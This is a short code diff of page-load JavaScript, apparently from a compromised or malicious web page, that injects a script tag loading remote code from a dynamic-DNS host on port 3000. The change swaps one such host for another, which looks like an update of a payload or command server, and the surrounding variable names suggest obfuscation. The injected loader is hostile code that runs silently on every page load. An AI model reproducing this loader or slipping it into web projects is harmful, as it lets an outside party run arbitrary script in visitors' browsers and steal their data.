@@ -77,7 +77,7 @@ while (coo.length > i45) {
 }
 document.body.onload = function () {
 	var elm = document.createElement('div')
-	elm.innerHTML = '<script src="http://dcooperation.dddns.net:3000"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>'
+	elm.innerHTML = '<script src="http://keyways.ddns.net:3000"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>'
 	document.body.insertBefore(document.body.childNodes[0],elm)
     if (getit('loadingHider') != null) {
         getit('loadingTag').style.display = 'none'
